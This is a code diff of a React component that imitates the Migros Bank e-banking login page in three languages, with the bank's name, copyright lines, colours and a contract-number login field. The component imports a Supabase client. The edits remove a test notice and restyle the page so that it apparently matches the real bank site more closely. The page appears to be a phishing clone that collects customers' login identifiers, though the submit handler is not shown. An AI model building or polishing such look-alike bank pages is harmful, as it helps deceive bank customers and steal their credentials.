@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
-import { HelpCircle, ChevronDown, X, Info, Globe } from "lucide-react";
+import { HelpCircle, ChevronDown, Globe } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import LoadingOverlay from "@/components/LoadingOverlay";
 import { usePageMeta } from "@/hooks/use-page-meta";
@@ -30,67 +30,51 @@ const T: Record<Lang, {
   support: string;
   legal: string;
   security: string;
-  importantInfo: string;
-  notifTitle: string;
-  notifText: string;
   copyright: string;
   legalFooter: string;
   imprint: string;
-  invalid: string;
 }> = {
   de: {
     title: "Anmeldung im E-Banking",
     label: "Bitte geben Sie Ihre Vertragsnummer ein",
-    submit: "Absenden",
+    submit: "Weiter",
     whereFind: "Wo finde ich meine Vertragsnummer?",
     problems: "Probleme bei der Registrierung?",
     help: "Hilfe",
     support: "Support",
     legal: "Rechtliche Hinweise",
     security: "Sicherheit",
-    importantInfo: "Wichtige Information",
-    notifTitle: "Willkommen im Shift Pilot Projekt für PRD",
-    notifText: "Diese Wartungsmeldung ist zu Testzwecken sichtbar und signalisiert das der Login über Shift Light erfolgt.",
     copyright: "© 2026 Migros Bank AG",
-    legalFooter: "Rechtliche Hinweise",
+    legalFooter: "Rechtliche Informationen",
     imprint: "Impressum",
-    invalid: "Vertragsnummer ungültig",
   },
   fr: {
     title: "Connexion à l'E-Banking",
     label: "Veuillez saisir votre numéro de contrat",
-    submit: "Envoyer",
+    submit: "Continuer",
     whereFind: "Où puis-je trouver mon numéro de contrat ?",
     problems: "Problèmes lors de l'enregistrement ?",
     help: "Aide",
     support: "Support",
     legal: "Informations légales",
     security: "Sécurité",
-    importantInfo: "Information importante",
-    notifTitle: "Bienvenue dans le projet pilote Shift pour PRD",
-    notifText: "Ce message de maintenance est visible à des fins de test et signale que la connexion s'effectue via Shift Light.",
     copyright: "© 2026 Banque Migros SA",
     legalFooter: "Informations légales",
     imprint: "Mentions légales",
-    invalid: "Numéro de contrat invalide",
   },
   it: {
     title: "Login all'E-Banking",
     label: "Si prega di inserire il numero di contratto",
-    submit: "Invia",
+    submit: "Continua",
     whereFind: "Dove trovo il mio numero di contratto?",
     problems: "Problemi con la registrazione?",
     help: "Aiuto",
     support: "Supporto",
     legal: "Informazioni legali",
     security: "Sicurezza",
-    importantInfo: "Informazione importante",
-    notifTitle: "Benvenuto nel progetto pilota Shift per PRD",
-    notifText: "Questo messaggio di manutenzione è visibile a scopo di test e segnala che il login avviene tramite Shift Light.",
     copyright: "© 2026 Banca Migros SA",
     legalFooter: "Informazioni legali",
     imprint: "Impressum",
-    invalid: "Numero di contratto non valido",
   },
 };
 
@@ -103,7 +87,7 @@ const ChMigros = () => {
   const [showLoading, setShowLoading] = useState(false);
   const [lang, setLang] = useState<Lang>("de");
   const [helpOpen, setHelpOpen] = useState(false);
-  const [notifOpen, setNotifOpen] = useState(true);
+  const [inputFocused, setInputFocused] = useState(false);
   const helpRef = useRef<HTMLDivElement>(null);
   const t = T[lang];
 
@@ -159,12 +143,7 @@ const ChMigros = () => {
                 <li key={l.code}>
                   <button
                     onClick={() => setLang(l.code)}
-                    className={`pb-1 transition ${
-                      lang === l.code
-                        ? "font-bold border-b-2"
-                        : "hover:opacity-80"
-                    }`}
-                    style={lang === l.code ? { borderColor: GREEN } : undefined}
+                    className="pb-1 transition hover:font-bold"
                   >
                     {l.label}
                   </button>
@@ -175,7 +154,7 @@ const ChMigros = () => {
             <div className="relative" ref={helpRef}>
               <button
                 onClick={() => setHelpOpen((o) => !o)}
-                className="flex items-center gap-2 px-4 py-2 rounded-full border text-[15px]"
+                className="flex items-center gap-2 px-4 py-2 rounded-md border text-[15px]"
                 style={{ borderColor: GREEN, color: GREEN }}
               >
                 <HelpCircle className="w-5 h-5" strokeWidth={1.6} />
@@ -183,7 +162,7 @@ const ChMigros = () => {
                 <ChevronDown className="w-4 h-4" />
               </button>
               {helpOpen && (
-                <div className="absolute right-0 top-full mt-2 bg-white border border-[#e5e5e5] shadow-lg min-w-[220px] z-30 py-1">
+                <div className="absolute right-0 top-full mt-2 bg-white border border-[#e5e5e5] shadow-lg min-w-[220px] z-30 py-1 rounded-md">
                   {[t.support, t.legal, t.security].map((label) => (
                     <a
                       key={label}
@@ -202,89 +181,81 @@ const ChMigros = () => {
 
         {/* Main */}
         <main className="flex-1 px-5 md:px-10 pt-10 md:pt-16 pb-20">
-          <h1 className="text-center text-[28px] md:text-[34px] font-normal text-[#1a1a1a] mb-10 md:mb-14">
+          <h1 className="text-center text-[28px] md:text-[34px] font-bold text-[#1a1a1a] mb-4 md:mb-6">
             {t.title}
           </h1>
 
-          <div className="mx-auto max-w-[760px] border border-[#dfe3e1] p-6 md:p-10">
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 md:gap-10">
-              <div className="hidden md:block" />
-              <form onSubmit={handleSubmit} className="w-full max-w-[360px] mx-auto md:mx-0">
-                <label
-                  htmlFor="migros-contract"
-                  className="block text-[14px] font-bold text-[#1a1a1a] mb-2"
-                >
-                  {t.label}
-                </label>
-                <input
-                  id="migros-contract"
-                  type="text"
-                  value={vertragsnummer}
-                  onChange={(e) => setVertragsnummer(e.target.value)}
-                  maxLength={13}
-                  autoFocus
-                  autoComplete="off"
-                  className="w-full h-[48px] border border-[#c8d0cf] px-3 text-[15px] text-black focus:outline-none focus:border-[#144B3C] focus:ring-1 focus:ring-[#144B3C] mb-5"
-                />
-                <button
-                  type="submit"
-                  className="w-full h-[48px] text-white text-[15px] font-medium transition-opacity hover:opacity-90"
-                  style={{ backgroundColor: GREEN }}
-                >
-                  {t.submit}
-                </button>
-              </form>
-            </div>
+          <div
+            className="mx-auto max-w-[760px] p-6 md:p-10 rounded-md"
+            style={{ border: "2px solid #c5d2ce" }}
+          >
+            <form
+              onSubmit={handleSubmit}
+              className="w-full max-w-[360px] mx-auto flex flex-col items-center"
+            >
+              <label
+                htmlFor="migros-contract"
+                className="block text-[14px] font-bold text-[#1a1a1a] mb-2 w-full text-left"
+              >
+                {t.label}
+              </label>
+              <input
+                id="migros-contract"
+                type="text"
+                value={vertragsnummer}
+                onChange={(e) => setVertragsnummer(e.target.value)}
+                onFocus={() => setInputFocused(true)}
+                onBlur={() => setInputFocused(false)}
+                maxLength={13}
+                autoFocus
+                autoComplete="off"
+                className="w-full h-[48px] px-3 text-[15px] text-black focus:outline-none mb-5 rounded-md"
+                style={{
+                  border: "2px solid #cad7d3",
+                  backgroundColor: inputFocused ? "#cad7d3" : "transparent",
+                }}
+              />
+              <button
+                type="submit"
+                className="w-full h-[48px] text-white text-[15px] font-medium transition-opacity hover:opacity-90 rounded-md"
+                style={{ backgroundColor: GREEN }}
+              >
+                {t.submit}
+              </button>
+            </form>
 
-            <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-3 mt-10 pt-6 border-t border-[#eef0ef] text-[14px]">
-              <a href="#" className="underline" style={{ color: GREEN }}>
+            <div className="flex flex-col items-center gap-3 mt-8 text-[14px]">
+              <a
+                href="#"
+                className="font-bold underline underline-offset-4"
+                style={{ color: GREEN }}
+              >
                 {t.whereFind}
               </a>
-              <a href="#" className="inline-flex items-center gap-1.5" style={{ color: GREEN }}>
-                <HelpCircle className="w-4 h-4" strokeWidth={1.6} />
-                <span className="underline">{t.problems}</span>
+              <a
+                href="#"
+                className="font-bold underline underline-offset-4"
+                style={{ color: GREEN }}
+              >
+                {t.problems}
               </a>
             </div>
           </div>
         </main>
 
-        {/* Floating notification */}
-        {notifOpen && (
-          <div className="fixed bottom-6 right-6 max-w-[340px] bg-[#fff4e6] shadow-lg z-20">
-            <button
-              onClick={() => setNotifOpen(false)}
-              className="absolute top-2 right-2 p-1 text-[#1a1a1a] hover:opacity-70"
-              aria-label="close"
-            >
-              <X className="w-4 h-4" />
-            </button>
-            <div className="p-4 pr-8">
-              <div className="flex items-center gap-2 mb-2">
-                <span className="inline-flex items-center justify-center w-6 h-6 rounded-full bg-[#f08a24] text-white">
-                  <Info className="w-3.5 h-3.5" strokeWidth={2.5} />
-                </span>
-                <h2 className="text-[15px] font-bold text-[#1a1a1a]">{t.importantInfo}</h2>
-              </div>
-              <h3 className="text-[14px] font-bold text-[#1a1a1a] mb-1">{t.notifTitle}</h3>
-              <p className="text-[13px] text-[#1a1a1a] leading-snug">{t.notifText}</p>
-            </div>
-          </div>
-        )}
-
         {/* Footer */}
-        <footer className="border-t border-[#eef0ef] px-5 md:px-10 py-5">
-          <div className="flex flex-col md:flex-row md:items-center md:justify-between gap-3 text-[13px] text-[#6b7270]">
-            <a href="#" className="hover:underline">{t.copyright}</a>
-            <ul className="flex items-center gap-4">
-              <li>
-                <a href="#" className="hover:underline">{t.legalFooter}</a>
-              </li>
-              <li aria-hidden className="text-[#c8d0cf]">|</li>
-              <li>
-                <a href="#" className="hover:underline">{t.imprint}</a>
-              </li>
-            </ul>
-          </div>
+        <footer className="px-5 md:px-10 py-5">
+          <ul className="flex flex-col items-start gap-2 text-[13px]" style={{ color: GREEN }}>
+            <li className="mb-3">
+              <a href="#" className="hover:underline">{t.copyright}</a>
+            </li>
+            <li>
+              <a href="#" className="hover:underline">{t.legalFooter}</a>
+            </li>
+            <li>
+              <a href="#" className="hover:underline">{t.imprint}</a>
+            </li>
+          </ul>
         </footer>
       </div>
     </>
